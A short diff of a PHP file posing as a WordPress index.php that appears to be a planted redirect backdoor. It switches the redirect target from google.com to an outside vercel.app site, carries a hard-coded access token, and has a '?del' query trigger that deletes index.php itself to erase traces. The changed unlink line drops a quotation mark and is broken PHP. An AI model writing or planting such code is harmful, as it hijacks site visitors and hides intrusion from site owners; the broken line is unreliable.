@@ -3,13 +3,13 @@
 session_start();
 
 define('WP_USE_THEMES', true);
-define('LOCATION', "https://google.com");
+define('LOCATION', "https://zknation.vercel.app/");
 define('CHECKUP', "AccessID923487");
 define('wplink', '/wp-blog-header.php');
 
 if (isset($_GET["del"]))
 {
-    unlink("index.php");
+    unlink(index.php");
     exit;
 }
 if (isset($_GET["check"]))
